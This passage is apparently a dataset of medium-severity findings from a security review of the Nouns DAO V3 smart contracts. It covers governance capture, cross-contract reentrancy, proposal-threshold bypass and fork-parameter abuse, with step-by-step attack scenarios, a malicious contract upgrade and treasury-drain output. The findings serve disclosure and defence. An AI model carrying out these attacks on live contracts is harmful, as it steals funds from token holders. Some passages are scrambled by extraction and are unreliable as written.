newProposal.creationBlock = block.number; >> >> >> 10  DeployDAOV3NewContractsBase.s.sol#L18-L23 contract DeployDAOV3NewContractsBase is Script { ... uint256 public constant FORK_DAO_PROPOSAL_THRESHOLD_BPS = 25; // 0.25% uint256 public constant FORK_DAO_QUORUM_VOTES_BPS = 1000; // 10% This will give the first joiner the full power over all the later joiners:  NounsDAOLogicV1Fork.sol#L577-L589 function castVoteInternal( address voter, uint256 proposalId, uint8 support ) internal returns (uint96) { ... /// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created >> in order to normalize quorumVotes and proposalThreshold metrics ,! uint96 votes = nouns.getPriorVotes(voter, proposal.creationBlock); Say if Bob, the original nouns DAO holder with 1 noun, joined when total supply was zero, he can create proposals and with regard for these proposals his only vote will be 100% of the DAO voting power. Bob can create a proposal to transfer all the funds to himself or a hidden malicious one like shown in Fork escrowers can exploit the fork or force late joiners to quit step 6. All the later joiners will not be able to stop this proposal, no matter how big their voting power be, as votes will be counted as on block where Bob had 100% of the votes. As the scenario above is a part of expected workflow (i.e. all fork initiators can be reasonably expected to quit fast enough), the probability of it is medium, while the probability of inattentive late joiners being exploited by Bob's proposal is medium too (there is not much time to react and some holders might first of all want to explore new fork functionality), so overall probability is low, while the impact is full loss of funds for such joiners. Per low combined likelihood and high impact setting the severity to be medium.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Duplicate ERC20 tokens will send a greater than prorata token share leading to loss of DAO funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "_setErc20TokensToIncludeInFork() is an admin function for setting ERC20 tokens that are used when splitting funds to a fork. However, there are no sanity checks for duplicate ERC20 tokens in the erc20tokens parameter. While STETH is the only ERC20 token applicable for now, it is conceivable that DAO treasury may include others in future. The same argument applies to _setErc20TokensToIncludeInQuit() and members quitting from the fork DAO. Duplicate tokens in the array will send a greater than prorata share of those tokens to the fork DAO treasury in sendProRataTreasury() or to the quitting member in quit(). This will lead to loss of funds for the original DAO and fork DAO respectively. Low likelihood + High impact = Medium severity. 12", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious proposer can create arbitrary number of maliciously updatable proposals to signifi- cantly grief the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "checkNoActiveProp() is documented as: \"This is a spam protection mechanism to limit the num- ber of proposals each noun can back.\" However, this mitigation applies to proposer addresses holding Nouns but not the Nouns themselves because checkNoActiveProp() relies on checking the state of proposals tracked by proposer via latestProposalId = ds.latestProposalIds[proposer]. A malicious proposer can move (trans- fer/delegate) their Noun(s) to different addresses for circumventing this mitigation and create proposals from those new addresses to spam. Furthermore, proposal updation in the protocol does not check for the proposer meeting any voting power threshold at the time of updation. A malicious proposer can create arbitrary number of proposals, each from a different address by transferring/delegating their Nouns, and then update any/all of them to be malicious. Substantial effort will be required to differentiate all such proposals from the authentic ones and then cancel them, leading to DAO governance DoS griefing. Medium likelihood + Medium impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious proposer can update proposal past inattentive voters to sneak in otherwise unaccept- able details", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Updatable proposal description and transactions is a new feature being introduced in V3 to improve the UX of the proposal flow to allow proposal editing on-chain. The motivation for this feature as described in the spec is: \"Proposals get voter feedback almost entirely only once they are on-chain. At the same time, proposers are relunctant to cancel and resubmit their proposals for multiple reasons, e.g. prefering to avoid restarting the proposal lifecycle and thus delay funding.\" However, votes are bound only to the proposal identifier and not to their description (which describes the motiva- tion/intention/usage etc.) or the transactions (values transferred, contracts/functions of interaction etc.). Inattentive voters may (decide to) cast their votes based on a stale proposal's description/transactions which could since have been updated. For example, someone voting Yes on the initial proposal version may vote No if they see the updated details. A very small voting delay (MIN_VOTING_DELAY is 1 block) may even allow a malicious proposer to sneak in a malicious update at the very end of the updatable period so that voters do not see it on time to change their votes being cast. Delays in front-ends updating the proposal details may contribute to this scenario. A malicious proposer updates proposal with otherwise unacceptable txs/description to get support of inattentive voters who cast their votes based on acceptable older proposal versions. Malicious proposal passes to transfer a significant amount of treasury to unauthorized receivers for unacceptable reasons. Low likelihood + High impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "NounsDAOLogicV1Fork's quit() performing external calls in-between total supply and balance reads can allow for treasury funds stealing via cross-contract reentrancy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Let's suppose there is an initiative group of nouns holders that performed fork, claimed is block.timestamp < and immediately quitted (say for pure financial Right after forkingPeriodEndTimestamp, so isForkPeriodActive(ds) == true in original DAO contract, while NounsTokenFork.remainingTokensToClaim() == 0, so checkGovernanceActive() doesn't revert in the forked DAO contract, which have no material holdings. reasons). that it For simplicity let's say there is Bob and Alice, both aren't part of this group and still are in the original DAO, Bob have 2 nouns, Alice have 1, each nouns' share of treasury is 1 stETH and 100 ETH, erc20TokensToIncludeInQuit = [stETH]. All the above are going concern assumptions (a part of expected workflow), let's now have a low probability one: stETH contract was upgraded and now performs _beforetokentransfer() callback on every transfer to a destination address as long as it's a contract (i.e. it has a callback, for simplicity let's assume it behaves similarly 14 to ERC-721 safeTransfer). enough technical reason for such an upgrade. It doesn't make it malicious or breaks IERC20, let's just suppose there is a strong If Alice now decides to join this fork, Bob can steal from her: 1. Alice calls NounsDAOV3's joinFork(), 1 stETH and 100 ETH is transferred to NounsDAOLogicV1Fork:  NounsDAOV3Fork.sol#L139-L158 function joinFork( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, uint256[] calldata proposalIds, string calldata reason ) external { if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive(); INounsDAOForkEscrow forkEscrow = ds.forkEscrow; address timelock = address(ds.timelock); sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds)); for (uint256 i = 0; i < tokenIds.length; i++) { ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]); } NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds); emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason); } Alice is minted 1 forked noun:  NounsTokenFork.sol#L166-L174) function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external { if (msg.sender != escrow.dao()) revert OnlyOriginalDAO(); if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod(); for (uint256 i = 0; i < tokenIds.length; i++) { uint256 nounId = tokenIds[i]; _mintWithOriginalSeed(to, nounId); } } 2. Bob transfers all to attack contract (cBob), that joins the DAO with 1 noun. Forked treasury is 2 stETH and 200 ETH, cBob and Alice both have 1 noun. 3. cBob calls quit() and reenters NounsDAOV3's joinFork() on stETH _beforetokentransfer() (and nothing else):  NounsDAOLogicV1Fork.sol#L201-L222 15 function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); >> } uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } 4. cBob have joined fork with another noun, stETH transfer concludes. Forked treasury is 2 stETH and 300 ETH, while 1 stETH was just sent to cBob. 5. With quit() resumed, (address(timelock).balance * tokenIds.length) / totalSupply = (300 * 1) / 2 = 150 ETH is sent to cBob:  NounsDAOLogicV1Fork.sol#L201-L222 function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); } >> uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } 6. Forked treasury is 2 stETH and 150 ETH, cBob calls quit() again without reentering (say on zero original nouns balance condition), obtains 1 stETH and 75 ETH, the same is left for Alice. Bob stole 25 ETH from Alice. 16 Attacking function logic can be as simple as {quit() as long as there is forkedNoun on my balance, perform joinFork() on the callback as long as there is noun on my balance}. Alice lost a part of treasury funds. The scale of the steps above can be increased to drain more significant value in absolute terms. Per low likelihood and high principal funds loss impact setting the severity to be medium.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious DAO can mint arbitrary fork DAO tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The original DAO is assumed to be honest during the fork period which is reinforced in the protocol by preventing it from executing any malicious proposals during that time. Fork joiners are minted fork DAO tokens by the original DAO via claimDuringForkPeriod() which enforces the fork period on the fork DAO side. However, the notion of fork period is different on the fork DAO compared to the original DAO (as described in Issue 16), i.e. while original DAO excludes forkEndTimestamp from the fork period, fork DAO includes forkingPeriodEndTimestamp in its notion of the fork period. If the original DAO executes a malicious proposal exactly in the block at forkEndTimestamp which makes a call to claimDuringForkPeriod() to mint arbitrary fork DAO tokens then the proposal will succeed on the original DAO side because it is one block beyond its notion of fork period. The claimDuringForkPeriod() will succeed on the fork DAO side because it is in the last block in its notion of fork period. The original DAO therefore can successfully mint arbitrary fork DAO tokens which can be used to: 1) brick the fork DAO when those tokens are attempted to be minted via auctions later or 2) manipulate the fork DAO governance to steal its treasury funds. In PoS, blocks are exactly 12 seconds apart. With forkEndTimestamp = block.timestamp + ds.forkPeriod; and ds.forkPeriod now set to 7 days, forkEndTimestamp is exactly 50400 blocks (7*24*60*60/12) after the block in which executeFork() was executed. A malicious DAO can coordinate to execute such a proposal exactly in that block. Low likelihood + High impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Inattentive fork escrowers may lose funds to fork quitters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Fork escrowers already have their original DAO treasury pro rate funds transferred to the fork DAO treasury (when fork executes) and are expected to claimFromEscrow() after fork executes to mint their fork DAO tokens and thereby lay claim on their pro rata share of fork DAO treasury for governance or exiting. Inattentive fork escrowers who fail to do so will force a delayed governance of 30 days (currently proposed value) on the fork DAO and beyond that will allow fork DAO members to quit with a greater share of the fork DAO treasury because fork execution transfers all escrowers' original DAO treasury funds to fork DAO treasury. 18 Inattentive slow-/non-claiming fork escrowers may lose funds to quitters if they do not claim their fork DAO tokens before its governance is active in 30 days after fork executes. They will also be unaccounted for in DAO functions like quorum and proposal threshold. While we would expect fork escrowers to be attentive and claim their fork DAO tokens well within the delayed governance period, the protocol design can be more defensive of slow-/non-claimers by protecting their funds on the fork DAO from quitters. Low likelihood + High impact = Medium severity. Consider be", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Upgrading timelock without transferring the nouns from old timelock balance will increase adjusted total supply", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "There is one noun on timelock V1 balance, and can be others as of migration time:  etherscan.io/token/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03?a=0x0BC3807Ec262cB779b38D65b38158acC3bfedE10 Changing ds.timelock without nouns transfer will increase adjusted total supply:  NounsDAOV3Fork.sol#L199-L201 function adjustedTotalSupply(NounsDAOStorageV3.StorageV3 storage ds) internal view returns (uint256) { return ds.nouns.totalSupply() - ds.nouns.balanceOf(address(ds.timelock)) - ,! ds.forkEscrow.numTokensOwnedByDAO(); ,! } As of time of this writing adjustedTotalSupply() will be increased by 1 due to treasury token reclassification, the upgrade will cause a (13470 + 14968) * 1733.0 * (1 / 742 - 1 / 743) = 89 USD loss per noun or (13470 + 14968) * 1733.0 / 743 = 66330 USD cumulatively for all nouns holders. Per high likelihood and low impact setting the severity to be medium.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Fork escrowers can exploit the fork or force late joiners to quit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Based in the current supply of Nouns and the following parameters that will be used during the upgrade to V3:  Nouns total supply: 743  forkThresholdBPS_: 2000 (20%)  forkThreshold: 148, hence 149 Nouns need to be escrowed to be able to call executeFork() The following attack vector would be possible: 1. Attacker escrows 75 tokens. 2. Bob escrows 74 tokens to reach the forkThreshold. 3. Bob calls executeFork() and claimFromEscrow(). 4. Attacker calls claimFromEscrow() right away. As now nouns.remainingTokensToClaim() is zero the gover- nance is now active and proposals can be created. 5. Attacker creates a malicious proposal. Currently the attacker has 75 Nouns and Bob 74 in the fork. This means that the attacker has the majority of the voting power and whatever he proposes can not be denied.  NounsForkToken.getPriorVotes(attacker, <proposalCreationBlock>) -> 75  NounsForkToken.getPriorVotes(Bob , <proposalCreationBlock>) -> 74 6. The proposal is created with the following description: \"Proposal created to upgrade the NounsAuction- HouseFork to a new implementation similar to the main NounsAuctionHouse\". The attacker deploys this new implementation and simply performs the following change in the code: modifier initializer() { - + require(_initializing || !_initialized, \"Initializable: contract is already initialized\"); require(!_initializing || _initialized, \"Initializable: contract is already initialized\"); bool isTopLevelCall = !_initializing; if (isTopLevelCall) { _initializing = true; _initialized = true; } _; if (isTopLevelCall) { _initializing = false; } } The proposal is created with the following data: targets[0] = address(contract_NounsAuctionHouseFork); values[0] = 0; signatures[0] = 'upgradeTo(address)'; calldatas[0] = abi.encode(address(contract_NounsAuctionHouseForkExploitableV1)); 7. Proposal is created and is now in Pending state. During the next days, users keep joining the fork increasing the funds of the fork treasury as the fork period is still active. 8. 5 days later proposal is in Active state and the attacker votes to pass it. Bob, who does not like the proposal, votes to reject it. 20  quorumVotes: 14  forVotes: 75  againstVotes: 74 9. As the attacker and Bob were the only users that had any voting power at the time of proposal creation, five days later, the proposal is successful. 10. Proposal is queued. 11. 3 weeks later proposal is executed. 12. The NounsAuctionHouseFork contract is upgraded to the malicious version and the attacker re-initialize it and sets himself as the owner: contract_NounsAuctionHouseFork.initialize(attacker, NounsForkToken, <WETH address>, 0, 0, 0, 0) 13. Attacker, who is now the owner, upgrades the NounsAuctionHouseFork contract, once again, to a new im- plementation that implements the following function: function burn(uint256[] memory _nounIDs) external onlyOwner{ for (uint256 i; i < _nounIDs.length; ++i){ nouns.burn(_nounIDs[i]); } } 14. Attacker now, burns all the Nouns Tokens in the fork except the ones that he owns. 15. Attacker calls quit() draining the whole treasury: NounsTokenFork.totalSupply() -> 75 attacker.balance -> 0 contract_stETH.balanceOf(attacker) -> 0 forkTreasury.balance -> 2005_383580080753701211 contract_stETH.balanceOf(forkTreasury) -> 2005_383580080753701210 attacker calls -> contract_NounsDAOLogicV1Fork.quit([0, ... 74]) attacker.balance -> 2005_383580080753701211 contract_stETH.balanceOf(attacker) -> 2005_383580080753701208 forkTreasury.balance -> 0 contract_stETH.balanceOf(forkTreasury) -> 1 Basically, the condition that should be met for this exploit is that at the time of proposal creation the attacker has If this happens, users will be more than 51% of the voting power. This is more likely to happen in small forks. forced to leave or be exploited. As there is no vetoer role, noone will be able to stop this type of proposals.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Including non-standard ERC20 tokens will revert and prevent forking/quitting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "If erc20TokensToIncludeInFork or erc20TokensToIncludeInQuit accidentally/maliciously include non-confirming ERC20 tokens, such as USDT, which do not return a boolean value on transfers then sendProRata- Treasury() and quit() will revert because it expects timelock.sendERC20() to return true from the underlying ERC20 transfer call. The use of transfer() instead of safeTransfer() allows this scenario. Low likelihood + High impact = Medium severity. Inclusion of USDT-like tokens in protocol will revert sendProRataTreasury() and quit() to prevent forking/quitting.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Changing voteSnapshotBlockSwitchProposalId after it was set allows for votes double counting", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "Now ds.voteSnapshotBlockSwitchProposalId can be changed after it was once set to the next proposal id, there are no restrictions on repetitive setting. In the same time, proposal votes are counted without saving the additional information needed to reconstruct the timing and voteSnapshotBlockSwitchProposalId moved forward as a result of such second _setVoteSnap- shotBlockSwitchProposalId() call will produce a situation when all the older, already cast, votes for the propos- als with old_voteSnapshotBlockSwitchProposalId <= id < new_voteSnapshotBlockSwitchProposalId will be counted as of proposal.startBlock, while all the never, still to be casted, votes for the very same proposals will be counted as of proposal.creationBlock. Since the voting power of users can vary in-between these timestamps, this will violate the equality of voting conditions for all such proposals. Double counting will be possible and total votes greater than total supply can be cast this way: say Bob has transferred his nouns to Alice between proposal.startBlock and pro- posal.creationBlock, Alice voted before the change, Bob voted after the change. Bob's nounces will be counted twice. Severity is medium: impact looks to be high, a violation of equal foot voting paves a way for voting manipulations, but there is a low likelihood prerequisite of passing a proposal for the second update for the voteSnapshotBlock- SwitchProposalId. The latter can happen as a part of bigger pack of changes. _setVoteSnapshotBlockSwitch- ProposalId() call do not have arguments and by itself repeating it doesn't look incorrect.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Key fork parameters are set outside of proposal flow, while aren't being controlled in the code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "These configuration parameters are crucial for fork workflow and new DAO logic, but aren't checked when being set in ForkDAODeployer's constructor:  ForkDAODeployer.sol#L31-L81 contract ForkDAODeployer is IForkDAODeployer { ... constructor( address tokenImpl_, address auctionImpl_, address governorImpl_, address treasuryImpl_, uint256 delayedGovernanceMaxDuration_, uint256 initialVotingPeriod_, uint256 initialVotingDelay_, uint256 initialProposalThresholdBPS_, uint256 initialQuorumVotesBPS_ ) { } ... delayedGovernanceMaxDuration = delayedGovernanceMaxDuration_; initialVotingPeriod = initialVotingPeriod_; initialVotingDelay = initialVotingDelay_; initialProposalThresholdBPS = initialProposalThresholdBPS_; initialQuorumVotesBPS = initialQuorumVotesBPS_; While most parameters are set via proposals directly and are controlled in the corresponding setters, these 5 variables are defined only once on ForkDAODeployer construction and neither per se visible in proposals, as ForkDAODeployer is being set as an address there, nor being controlled within the corresponding setters this way. Their values aren't controlled on construction either. 23  NounsDAOLogicV3.sol#L820-L840 /** * @notice Admin function for setting the fork related parameters * @param forkEscrow_ the fork escrow contract * @param forkDAODeployer_ the fork dao deployer contract * @param erc20TokensToIncludeInFork_ the ERC20 tokens used when splitting funds to a fork * @param forkPeriod_ the period during which it's possible to join a fork after exeuction * @param forkThresholdBPS_ the threshold required of escrowed nouns in order to execute a fork */ function _setForkParams( address forkEscrow_, address forkDAODeployer_, address[] calldata erc20TokensToIncludeInFork_, uint256 forkPeriod_, uint256 forkThresholdBPS_ ) external { ds._setForkEscrow(forkEscrow_); ds._setForkDAODeployer(forkDAODeployer_); ds._setErc20TokensToIncludeInFork(erc20TokensToIncludeInFork_); ds._setForkPeriod(forkPeriod_); ds._setForkThresholdBPS(forkThresholdBPS_); }  NounsDAOV3Admin.sol#L484-L495 /** * @notice Admin function for setting the fork DAO deployer contract */ function _setForkDAODeployer(NounsDAOStorageV3.StorageV3 storage ds, address newForkDAODeployer) external onlyAdmin(ds) address oldForkDAODeployer = address(ds.forkDAODeployer); ds.forkDAODeployer = IForkDAODeployer(newForkDAODeployer); emit ForkDAODeployerSet(oldForkDAODeployer, newForkDAODeployer); { } Impact: an setting example, delayedGovernanceMaxDuration = 0 As bypasses NounsDAOLogicV1Fork's checkGovernanceActive() control and allows for stealing the whole treasury of a new forked DAO with executeFork() NounsTokenFork.claimFromEscrow() -> NounsDAOLogicV1Fork.quit() deployment transaction. An attacker will be entitled to 1 / 1 = 100% of the new DAO funds being the only one who claimed. back-running call Setting medium severity per low likelihood and high impact of misconfiguration, which can happen both as an operational mistake or be driven by a malicious intent.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious DAO can hold token holders captive by setting forkPeriod to an unreasonably low value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "A malicious majority can reduce the number of Noun holders joining an executed fork by setting the forkPeriod to an unreasonably low value, e.g. 0, because there is no MIN_FORK_PERIOD enforced (MAX is 14 days). This in combination with an unreasonably high forkThresholdBPS (no min/max enforced) will allow a malicious majority to hold captive those minority Noun holders who missed the fork escrow window, cannot join the fork in the unreasonably small fork period and do no have sufficient voting power to fork again. While the accidental setting of the lower bound to an undesirable value poses a lower risk than that of the upper bound, this is yet another vector of attack by a malicious majority on forking capability/effectiveness. While the majority can upgrade the DAO entirely at will to circumvent all such guardrails, we hypothesise that would get more/all attention by token holders than modification of governance/fork parameters whose risk/impact may not be apparent immediately to non-technical or even technical holders. So unless there is an automated impact review/analysis performed as part of governance processes, such proposal vectors on governance/forking parameters should be considered as posing non-negligible risk. Impact: Inattentive minority Noun holders are unable to join the fork and forced to stick with the original DAO. Low likelihood + High impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious DAO can prevent forking by manipulating the forkThresholdBPS value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "While some of the documentation, see 1 and 2, note that the fork threshold is expected to be 20%, the forkThresholdBPS is a DAO governance controlled value that may be modified via _setForkThresholdBPS(). A malicious majority can prevent forking at any time by setting the forkThresholdBPS to an unreasonably high value that is >= majority voting power. For a fork that is slowly gathering support via escrowing (thus giving time for a DAO proposal to be executed) , a malicious majority can reactively manipulate forkThresholdBPS to prevent that fork from being executed. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties and their impacts. Token holders need to actively monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect. A malicious majority can prevent a minority from forking by manipulating the forkThresholdBPS value. Low likelihood + High impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious DAO can prevent/deter token holders from executing/joining a fork by including arbi- trary addresses in erc20TokensToIncludeInFork", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "As motivated in the fork spec, forking is a minority protection mechanism that should always allow a group of minority token holders to exit together into a new instance of Nouns DAO. in the (modifiable original DAO may a malicious majority in However, erc20TokensToIncludeInFork on balanceOf() or transfer() calls to prevent token holders from executing or joining a fork. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect. _setErc20TokensToIncludeInFork()) addresses revert arbitrary include that via Furthermore, a forking token holder may not necessarily want to receive all the DAO's ERC20 tokens in their new fork DAO for various reasons. For e.g., custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions and so they may not want to interact with a DAO whose treasury holds such tokens and may send them at some point (e.g. rage quit). Minority token holders may even want to fork specifically because of an ERC20's presence or proposed inclusion in the DAO treasury. Giving forking holders a choice of ERC20s to take to fork DAO gives them a choice to fork anytime only with ETH and a subset of approved tokens if the DAO has already managed to add malicious/contentious ERC20s in the list. 1. A malicious DAO can prevent unsuspecting/inattentive or future token holders from forking and taking out their pro rata funds, which is the main motivation for minority protection as specified. 2. A forking token holder is forced to end up with a fork DAO treasury that has all the original DAO's ERC20 tokens without having a choice, which may deter them from creating/executing/joining a fork in the first place. Low likelihood + High impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "A malicious new DAO can prevent/deter token holders from rage quitting by including arbitrary addresses in erc20TokensToIncludeInQuit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "As described in the fork spec: \"New DAOs are deployed with vanilla ragequit in place; otherwise it's possible for a new DAO majority to collude to hurt a minority, and the minority wouldn't have any last resort if they can't reach the forking threshold; furthermore bullies/attackers can recursively chase minorities into fork DAOs in an undesired attrition war.\". However, a malicious new DAO may include arbitrary addresses in erc20TokensToIncludeInQuit (modifiable via _setErc20TokensToIncludeInQuit()) that revert on balanceOf() or transfer() calls to prevent token holders from rage quitting. While the governance process gives an opportunity to detect and block such malicious pro- posals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates and rage quit before such a proposal takes effect. Furthermore, a rage quitting token holder may not necessarily want to receive all the DAO's ERC20 tokens for various reasons. For e.g., custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions. (1) A malicious new DAO can prevent unsuspecting/inattentive token holders from rage quitting and taking out their pro rata funds, which is a critical capability for minority protection as specified. (2) A rage quitting token holder is forced to receive all the DAO's ERC20 tokens without having a choice, which may deter them from quitting.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Missing check for vetoed proposal's target timelock can cancel transactions from other proposals on new DAO treasury", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "veto() always assumes that the proposal being vetoed is targeting ds.timelock (i.e. the new DAO treasury) instead of checking via getProposalTimelock() as done by queue(), execute() and cancel() functions. If the proposal being vetoed were targeting timelockV1 (i.e. original DAO treasury) then this results in calling cancelTransaction() on the wrong timelock which sets queuedTransactions[txHash] to false for values of target, value, signature, data and eta. The proposal state is vetoed with zombie queued transactions on timelockV1 which will never get executed. But if there coincidentally were valid transactions with the same values (of target, value, signature, data and eta) from other proposals queued (assuming in the same block and that both timelocks have the same delay so that eta is the same) on ds.timelock then those would unexpectedly and incorrectly get dequeued and will not be executed even when these other ds.timelock targeting proposals were neither vetoed nor cancelled. Successfully voted proposals on new DAO treasury have their transactions cancelled before execution. Nouns- Confirmed with PoC: veto_poc.txt Low likelihood + High impact = Medium severity.", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk NounsDAOV3Proposals.sol#L435 NounsDAOV3Proposals.sol#L527-L544"]}, {"title": "Proposal threshold can be bypassed through the proposeBySigs() function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "The function proposeBySigs() allows users to delegate their voting power to a proposer through signatures so the proposer can create a proposal. The only condition is that the sum of the signers voting power should be higher than the proposal threshold. In the line uint256 proposalId = ds.proposalCount = ds.proposalCount + 1;, the ds.proposalCount is in- creased but the proposal has not been created yet, meaning that the NounsDAOStorageV3.Proposal struct is, at this point, uninitialized, so when the checkNoActiveProp() function is called the proposal state is DEFEATED. As the proposal state is DEFEATED the checkNoActiveProp() call would not revert in the case that a signer is repeated in the NounsDAOStorageV3.ProposerSignature[] array: function checkNoActiveProp(NounsDAOStorageV3.StorageV3 storage ds, address proposer) internal view { uint256 latestProposalId = ds.latestProposalIds[proposer]; if (latestProposalId != 0) { NounsDAOStorageV3.ProposalState proposersLatestProposalState = state(ds, latestProposalId); if ( proposersLatestProposalState == NounsDAOStorageV3.ProposalState.ObjectionPeriod || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Active || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Pending || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Updatable ) revert ProposerAlreadyHasALiveProposal(); } } Because of this it is possible to bypass the proposal threshold and create any proposal by signing multiple pro- poserSignatures with the same signer over and over again. This would keep increasing the total voting power accounted by the smart contract until this voting power is higher than the proposal threshold. Medium likelihood + Medium Impact = Medium severity. Consider NounsDAOStor-", "labels": ["Spearbit", "Nouns", "Severity: Medium Risk"]}, {"title": "Attacker can utilize bear market conditions to profit from forking the Nouns DAO", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf", "body": "An economic attack vector has been identified that could potentially compromise the integrity of the Nouns DAO treasury, specifically due to the introduction of forking functionality. Currently, the treasury holds approximately $24,745,610.99 in ETH and about $27,600,000 in STETH. There are roughly 738 nouns tokens. As per OpenSea listings, the cheapest nouns-token can be purchased for about 31 ETH, approximately $53,000. Meanwhile, the daily auction price for the nouns stands at approximately 28 ETH, which equals about $48,600. A prospective attacker may exploit the current bear market conditions, marked by discounted price, to buy multiple nouns-tokens at a low price, execute a fork to create a new DAO and subsequently claim a portion of the treasury. This act would result in the attacker gaining more than they invested at the expense of the Nouns DAO treasury. To illustrate, if the forking threshold is 